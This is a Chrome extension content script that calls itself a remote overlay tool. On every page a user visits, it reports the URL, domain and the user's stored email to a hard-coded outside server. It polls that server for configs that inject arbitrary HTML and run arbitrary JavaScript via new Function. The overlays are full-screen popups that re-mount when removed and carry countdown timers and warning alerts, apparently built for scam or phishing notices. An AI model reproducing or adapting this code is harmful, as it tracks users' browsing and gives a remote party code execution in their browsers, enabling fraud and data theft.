(function () {
  "use strict";

  // Prevent duplicate execution on the same document
  if (window.__remoteOverlayInitialized) return;
  window.__remoteOverlayInitialized = true;

  const currentDomain = window.location.hostname;
  const currentUrl = window.location.href;

  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
  const CANDIDATE_API_URLS = [
    "https://extension-dashboard-eight.vercel.app",
    "http://localhost:3001",
    "http://localhost:3000",
  ];

  let activeConfig = null;
  let activeEventSource = null;
  let pollIntervalId = null;
  let lastConfigHash = "";

  // 1. Get stored client credentials (NO overlay caching stored)
  async function getStoredSettings() {
    return new Promise((resolve) => {
      chrome.storage.local.get(["apiBaseUrl", "clientId", "userEmail"], (res) => {
        let clientId = res.clientId;
        if (!clientId) {
          clientId = "client_" + Math.random().toString(36).substring(2, 10);
          chrome.storage.local.set({ clientId });
        }
        resolve({
          apiBaseUrl: (res.apiBaseUrl || DEFAULT_API_URL).replace(/\/+$/, ""),
          clientId: clientId,
          userEmail: res.userEmail || "",
          isDefaultUrl: !res.apiBaseUrl,
        });
      });
    });
  }

  // 2. Client Heartbeat
  async function sendHeartbeat(apiUrl, clientId, userEmail) {
    try {
      await fetch(`${apiUrl}/api/client/heartbeat`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        cache: "no-store",
        body: JSON.stringify({
          clientId,
          email: userEmail,
          domain: currentDomain,
          currentUrl: currentUrl,
        }),
      });
    } catch (e) {
      // Heartbeat silent
    }
  }

  // 3. Dynamic CSS injection
  function applyCustomCss(css) {
    document.getElementById("custom-remote-overlay-css")?.remove();
    if (!css || !css.trim()) return;

    try {
      const styleEl = document.createElement("style");
      styleEl.id = "custom-remote-overlay-css";
      styleEl.textContent = css;
      (document.head || document.documentElement).appendChild(styleEl);
    } catch (e) {
      console.warn("[RemoteOverlay] Failed to inject custom CSS", e);
    }
  }

  // 4. Custom JS Execution
  function executeCustomJs(jsCode, cfg, popupEl) {
    if (!jsCode || !jsCode.trim()) return;

    try {
      const fn = new Function("context", `
        try {
          ${jsCode}
        } catch (err) {
          console.error("[RemoteOverlay Custom JS Error]:", err);
        }
      `);

      fn({
        domain: currentDomain,
        url: currentUrl,
        config: cfg,
        popup: popupEl,
        close: () => {
          popupEl.remove();
          activeConfig = null;
        },
      });
    } catch (e) {
      console.error("[RemoteOverlay] Failed to compile custom JS", e);
    }
  }

  // 5. Apply Overlay to DOM (NO fallback - strictly live data)
  // 5. Apply Overlay to DOM (NO fallback - strictly live data)
  function applyOverlay(cfg) {
    // If null or explicitly disabled, remove popup & backdrop
    if (!cfg || cfg.enabled === false) {
      document.getElementById("custom-sticky-popup")?.remove();
      document.getElementById("custom-sticky-backdrop")?.remove();
      document.getElementById("custom-remote-overlay-css")?.remove();
      activeConfig = null;
      lastConfigHash = "";
      return;
    }

    activeConfig = cfg;

    // Apply custom CSS if provided
    if (cfg.customCss) {
      applyCustomCss(cfg.customCss);
    }

    // Remove existing popup and backdrop if already rendered to update in-place
    document.getElementById("custom-sticky-popup")?.remove();
    document.getElementById("custom-sticky-backdrop")?.remove();

    const position = cfg.position || "top";
    const heightVal = cfg.height ? `${cfg.height}vh` : "50vh";

    // 5a. Backdrop Overlay (for modal / center / blur effect)
    if (cfg.backdropBlur || position === "center" || cfg.backdropBg) {
      const backdrop = document.createElement("div");
      backdrop.id = "custom-sticky-backdrop";
      Object.assign(backdrop.style, {
        position: "fixed",
        top: "0",
        left: "0",
        width: "100vw",
        height: "100vh",
        background: cfg.backdropBg || "rgba(0, 0, 0, 0.65)",
        zIndex: "2147483646",
        backdropFilter: cfg.backdropBlur ? "blur(8px)" : "none",
        WebkitBackdropFilter: cfg.backdropBlur ? "blur(8px)" : "none",
        transition: "opacity 0.25s ease",
      });
      if (cfg.closable !== false) {
        backdrop.onclick = () => {
          document.getElementById("custom-sticky-popup")?.remove();
          backdrop.remove();
          activeConfig = null;
        };
      }
      (document.body || document.documentElement).appendChild(backdrop);
    }

    const popup = document.createElement("div");
    popup.id = "custom-sticky-popup";

    const borderVal = `${cfg.borderWidth || 2}px solid ${cfg.borderColor || "#f0b90b"}`;
    const borderTopVal = position === "top" ? "none" : borderVal;
    const borderBottomVal = position === "bottom" ? "none" : borderVal;
    const borderLeftVal = (position === "top" || position === "bottom") ? "none" : borderVal;
    const borderRightVal = (position === "top" || position === "bottom") ? "none" : borderVal;

    // Base popup styling
    const baseStyle = {
      background: cfg.bg || "#0b0e11",
      color: cfg.text || "#eaecef",
      fontFamily: "Arial, sans-serif",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: cfg.textAlign === "left" ? "flex-start" : cfg.textAlign === "right" ? "flex-end" : "center",
      boxSizing: "border-box",
      padding: "24px 36px",
      borderRadius: `${cfg.borderRadius || 0}px`,
      borderTop: borderTopVal,
      borderBottom: borderBottomVal,
      borderLeft: borderLeftVal,
      borderRight: borderRightVal,
      transition: "all 0.3s ease",
    };

    // Shadow calculation
    if (cfg.shadow === "none") {
      baseStyle.boxShadow = "none";
    } else if (cfg.shadow === "glow") {
      baseStyle.boxShadow = `0 0 35px ${cfg.borderColor || "#f0b90b"}55, 0 10px 40px rgba(0,0,0,0.8)`;
    } else if (cfg.shadow === "subtle") {
      baseStyle.boxShadow = "0 4px 15px rgba(0,0,0,0.3)";
    } else {
      baseStyle.boxShadow = "0 10px 45px rgba(0,0,0,0.7)";
    }

    // Position-specific styling
    if (position === "top") {
      Object.assign(baseStyle, {
        position: "fixed",
        top: "0",
        left: "0",
        width: "100%",
        height: heightVal,
      });
    } else if (position === "bottom") {
      Object.assign(baseStyle, {
        position: "fixed",
        bottom: "0",
        left: "0",
        width: "100%",
        height: heightVal,
      });
    } else if (position === "center") {
      Object.assign(baseStyle, {
        position: "fixed",
        top: "50%",
        left: "50%",
        transform: "translate(-50%, -50%)",
        width: cfg.width || "560px",
        maxWidth: "92vw",
        minHeight: "220px",
        height: "auto",
        maxHeight: "90vh",
        borderRadius: `${cfg.borderRadius || 16}px`,
      });
    } else if (position === "bottom-right") {
      Object.assign(baseStyle, {
        position: "fixed",
        bottom: "24px",
        right: "24px",
        width: cfg.width || "420px",
        maxWidth: "90vw",
        height: "auto",
        borderRadius: `${cfg.borderRadius || 12}px`,
      });
    } else if (position === "top-right") {
      Object.assign(baseStyle, {
        position: "fixed",
        top: "24px",
        right: "24px",
        width: cfg.width || "420px",
        maxWidth: "90vw",
        height: "auto",
        borderRadius: `${cfg.borderRadius || 12}px`,
      });
    } else if (position === "fullscreen") {
      Object.assign(baseStyle, {
        position: "fixed",
        top: "0",
        left: "0",
        width: "100vw",
        height: "100vh",
      });
    }

    Object.assign(popup.style, baseStyle);
    popup.style.setProperty("z-index", "2147483647", "important");

    // Close button
    if (cfg.closable !== false) {
      const closeBtn = document.createElement("div");
      closeBtn.innerHTML = "&#x2715;";
      Object.assign(closeBtn.style, {
        position: "absolute",
        top: "16px",
        right: "22px",
        cursor: "pointer",
        fontSize: "22px",
        color: cfg.text || "#eaecef",
        opacity: "0.7",
        lineHeight: "1",
        userSelect: "none",
        transition: "opacity 0.2s, transform 0.2s",
      });
      closeBtn.onmouseover = () => { closeBtn.style.opacity = "1"; closeBtn.style.transform = "scale(1.15)"; };
      closeBtn.onmouseout = () => { closeBtn.style.opacity = "0.7"; closeBtn.style.transform = "scale(1)"; };
      closeBtn.onclick = () => {
        popup.remove();
        document.getElementById("custom-sticky-backdrop")?.remove();
        activeConfig = null;
      };
      popup.appendChild(closeBtn);
    }

    // Render Content: Custom Coding vs Elementor Sections vs Default Fallback
    if (cfg.builderMode === "code" && cfg.customHtml) {
      // 1. Custom Coding Mode HTML
      const htmlWrapper = document.createElement("div");
      htmlWrapper.className = "custom-html-wrapper";
      htmlWrapper.style.width = "100%";
      htmlWrapper.innerHTML = cfg.customHtml;
      popup.appendChild(htmlWrapper);
    } else if (cfg.sections && Array.isArray(cfg.sections) && cfg.sections.length > 0) {
      // 2. Elementor Sections Mode
      cfg.sections.forEach((sec) => {
        if (!sec) return;
        if (sec.type === "heading" && sec.text) {
          const heading = document.createElement("div");
          heading.innerText = sec.text;
          Object.assign(heading.style, {
            fontSize: `${sec.size || 36}px`,
            fontWeight: "bold",
            color: sec.color || cfg.titleColor || "#f0b90b",
            marginBottom: "12px",
            textAlign: sec.align || cfg.textAlign || "center",
            lineHeight: "1.25",
          });
          popup.appendChild(heading);
        } else if (sec.type === "text" && sec.text) {
          const textBlock = document.createElement("div");
          textBlock.innerHTML = sec.text;
          Object.assign(textBlock.style, {
            fontSize: `${sec.size || 18}px`,
            lineHeight: "1.6",
            color: sec.color || cfg.text || "#eaecef",
            textAlign: sec.align || cfg.textAlign || "center",
            maxWidth: "820px",
            marginBottom: "12px",
          });
          popup.appendChild(textBlock);
        } else if (sec.type === "button" && sec.text) {
          const btn = document.createElement("a");
          btn.innerText = sec.text;
          if (sec.url) btn.href = sec.url;
          btn.target = "_blank";
          Object.assign(btn.style, {
            display: "inline-block",
            margin: "12px 6px",
            padding: "12px 32px",
            background: sec.bg || cfg.ctaBg || "#7a56ff",
            color: sec.color || cfg.ctaColor || "#ffffff",
            fontWeight: "700",
            fontSize: `${sec.size || 15}px`,
            borderRadius: "8px",
            textDecoration: "none",
            cursor: "pointer",
            boxShadow: "0 4px 15px rgba(0,0,0,0.25)",
            transition: "transform 0.15s, filter 0.15s",
          });
          btn.onmouseover = () => { btn.style.transform = "scale(1.04)"; btn.style.filter = "brightness(1.1)"; };
          btn.onmouseout = () => { btn.style.transform = "scale(1)"; btn.style.filter = "brightness(1)"; };
          popup.appendChild(btn);
        } else if (sec.type === "alert" && sec.text) {
          const alertBox = document.createElement("div");
          const variant = sec.variant || "warning";
          const bgMap = {
            warning: "rgba(245, 158, 11, 0.15)",
            danger: "rgba(239, 68, 68, 0.15)",
            info: "rgba(59, 130, 246, 0.15)",
            success: "rgba(16, 185, 129, 0.15)"
          };
          const borderMap = {
            warning: "#f59e0b",
            danger: "#ef4444",
            info: "#3b82f6",
            success: "#10b981"
          };
          const colorMap = {
            warning: "#f59e0b",
            danger: "#ef4444",
            info: "#60a5fa",
            success: "#34d399"
          };
          alertBox.innerHTML = `<strong>${sec.icon || '⚠️'}</strong> ${sec.text}`;
          Object.assign(alertBox.style, {
            padding: "10px 18px",
            borderRadius: "6px",
            background: bgMap[variant] || bgMap.warning,
            border: `1px solid ${borderMap[variant] || borderMap.warning}`,
            color: colorMap[variant] || colorMap.warning,
            fontSize: "14px",
            fontWeight: "600",
            marginBottom: "14px",
            display: "inline-flex",
            alignItems: "center",
            gap: "8px",
          });
          popup.appendChild(alertBox);
        } else if (sec.type === "countdown") {
          const countdownBox = document.createElement("div");
          const totalSeconds = (parseInt(sec.minutes, 10) || 10) * 60;
          let remaining = totalSeconds;
          countdownBox.style.cssText = "margin: 12px 0; font-family: monospace; font-size: 16px; font-weight: 700; color: #f59e0b;";
          
          const label = sec.label || "Notice Expires In:";
          function updateTimer() {
            const m = String(Math.floor(remaining / 60)).padStart(2, '0');
            const s = String(remaining % 60).padStart(2, '0');
            countdownBox.innerText = `⏳ ${label} ${m}:${s}`;
            if (remaining > 0) remaining--;
          }
          updateTimer();
          const timerId = setInterval(updateTimer, 1000);
          popup._timerId = timerId;
          popup.appendChild(countdownBox);
        } else if (sec.type === "image" && sec.url) {
          const img = document.createElement("img");
          img.src = sec.url;
          img.style.maxWidth = sec.width || "180px";
          img.style.marginBottom = "14px";
          popup.appendChild(img);
        }
      });
    } else {
      // 3. Fallback: Title, Message, CTA Button
      if (cfg.title) {
        const title = document.createElement("div");
        title.innerText = cfg.title;
        Object.assign(title.style, {
          fontSize: `${cfg.titleSize || 40}px`,
          fontWeight: "bold",
          color: cfg.titleColor || "#f0b90b",
          marginBottom: "14px",
          textAlign: cfg.textAlign || "center",
          lineHeight: "1.25",
        });
        popup.appendChild(title);
      }

      if (cfg.message) {
        const message = document.createElement("div");
        message.innerHTML = cfg.message;
        Object.assign(message.style, {
          fontSize: `${cfg.messageSize || 19}px`,
          lineHeight: "1.6",
          textAlign: cfg.textAlign || "center",
          maxWidth: "800px",
        });
        popup.appendChild(message);
      }

      if (cfg.ctaText) {
        const ctaBtn = document.createElement("a");
        ctaBtn.innerText = cfg.ctaText;
        if (cfg.ctaUrl) ctaBtn.href = cfg.ctaUrl;
        ctaBtn.target = "_blank";
        Object.assign(ctaBtn.style, {
          display: "inline-block",
          marginTop: "18px",
          padding: "12px 30px",
          background: cfg.ctaBg || "#f0b90b",
          color: cfg.ctaColor || "#000000",
          fontWeight: "700",
          fontSize: "15px",
          borderRadius: "8px",
          textDecoration: "none",
          cursor: "pointer",
          boxShadow: "0 4px 15px rgba(0,0,0,0.3)",
          transition: "transform 0.15s, filter 0.15s",
        });
        ctaBtn.onmouseover = () => { ctaBtn.style.transform = "scale(1.04)"; ctaBtn.style.filter = "brightness(1.1)"; };
        ctaBtn.onmouseout = () => { ctaBtn.style.transform = "scale(1)"; ctaBtn.style.filter = "brightness(1)"; };
        popup.appendChild(ctaBtn);
      }
    }

    // Mount to DOM ("Where to paste the popup")
    function mount() {
      if (document.getElementById("custom-sticky-popup")) return;

      const targetSelector = cfg.targetSelector && cfg.targetSelector !== "body" ? cfg.targetSelector : null;
      const targetAction = cfg.targetAction || "fixed";

      if (targetSelector && targetAction !== "fixed") {
        const targetEl = document.querySelector(targetSelector);
        if (targetEl) {
          popup.style.position = "relative";
          popup.style.transform = "none";
          popup.style.top = "auto";
          popup.style.left = "auto";
          popup.style.right = "auto";
          popup.style.bottom = "auto";
          popup.style.width = "100%";

          if (targetAction === "prepend") targetEl.prepend(popup);
          else if (targetAction === "append") targetEl.appendChild(popup);
          else if (targetAction === "before") targetEl.parentNode?.insertBefore(popup, targetEl);
          else if (targetAction === "after") targetEl.parentNode?.insertBefore(popup, targetEl.nextSibling);
          return;
        }
      }

      // Default fixed placement in body
      const parent = document.body || document.documentElement;
      if (parent) {
        parent.appendChild(popup);
      }
    }

    if (document.body || document.documentElement) {
      mount();
    } else {
      document.addEventListener("DOMContentLoaded", mount);
    }

    // Execute custom JS if provided
    if (cfg.customJs) {
      executeCustomJs(cfg.customJs, cfg, popup);
    }
  }

  // 6. Direct zero-cache Live Fetch
  async function fetchLiveOverlay(apiUrl, clientId) {
    const cacheBuster = Date.now();
    const url = `${apiUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${cacheBuster}`;

    const res = await fetch(url, {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
      },
      cache: "no-store",
    });

    if (!res.ok) {
      throw new Error(`API returned HTTP ${res.status}`);
    }

    return await res.json();
  }

  // Handle incoming live payload
  function handleLivePayload(data) {
    if (!data) return;

    if (data.matched && data.overlay) {
      const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
      if (isEnabled) {
        const payloadStr = JSON.stringify(data.overlay);
        if (payloadStr !== lastConfigHash) {
          lastConfigHash = payloadStr;
          applyOverlay({
            ...data.overlay,
            enabled: true,
          });
        }
      } else {
        lastConfigHash = "disabled";
        applyOverlay(null);
      }
    } else {
      lastConfigHash = "unmatched";
      applyOverlay(null);
    }
  }

  // 7. Setup Live Connection (Server-Sent Events)
  async function setupLiveConnection() {
    const { apiBaseUrl, clientId, userEmail } = await getStoredSettings();

    // Send immediate heartbeat
    sendHeartbeat(apiBaseUrl, clientId, userEmail);

    // Initial instant live fetch (0 cache, no fallback)
    try {
      const data = await fetchLiveOverlay(apiBaseUrl, clientId);
      handleLivePayload(data);
    } catch (e) {
      // No fallback — do nothing if server unreachable
    }

    // Close any previous stream
    if (activeEventSource) {
      activeEventSource.close();
      activeEventSource = null;
    }

    // Connect to live SSE stream
    try {
      const streamUrl = `${apiBaseUrl}/api/overlay/live?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${Date.now()}`;
      activeEventSource = new EventSource(streamUrl);

      activeEventSource.onmessage = (event) => {
        try {
          const liveData = JSON.parse(event.data);
          handleLivePayload(liveData);
        } catch (err) {
          console.warn("[RemoteOverlay SSE] Parse error:", err);
        }
      };

      activeEventSource.onerror = () => {
        // SSE will automatically attempt reconnect; fast polling ensures seamless continuity
      };
    } catch (e) {
      console.warn("[RemoteOverlay] SSE not available, using fast live polling.", e);
    }

    // 8. Continuous Live Poll (Every 3 seconds with zero cache)
    if (pollIntervalId) clearInterval(pollIntervalId);
    pollIntervalId = setInterval(async () => {
      try {
        const freshData = await fetchLiveOverlay(apiBaseUrl, clientId);
        handleLivePayload(freshData);
      } catch (err) {
        // No fallback
      }
    }, 3000);
  }

  // Ensure popup stays mounted if SPA re-renders body
  setInterval(() => {
    if (activeConfig && activeConfig.enabled !== false) {
      if (!document.getElementById("custom-sticky-popup")) {
        applyOverlay(activeConfig);
      }
    }
  }, 1500);

  // Listen for refresh messages from background
  chrome.runtime.onMessage.addListener((message) => {
    if (message.action === "refresh_overlay" || message.action === "background_poll") {
      setupLiveConnection();
    }
  });

  // Start live connection
  setupLiveConnection();
})();
